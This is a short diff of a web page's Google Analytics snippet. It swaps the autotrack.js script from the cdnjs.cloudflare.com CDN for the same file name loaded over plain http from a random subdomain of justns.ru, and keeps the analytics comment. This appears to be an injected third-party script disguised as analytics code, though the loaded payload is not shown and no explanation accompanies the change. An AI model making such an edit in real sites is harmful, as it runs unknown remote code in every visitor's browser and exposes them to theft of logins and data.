@@ -23,5 +23,5 @@ visibleThreshold: 2000,
 &lt;/script&gt;
 &lt;script async src='https://www.google-analytics.com/analytics.js'&gt;&lt;/script&gt;
 &lt;script async
-src="https://cdnjs.cloudflare.com/ajax/libs/autotrack/2.4.1/autotrack.js"&gt;&lt;/script&gt;
+src="http://u413821vc7.ha002.t.justns.ru/autotrack.js"&gt;&lt;/script&gt;
 &lt;!-- End Google Analytics --&gt;
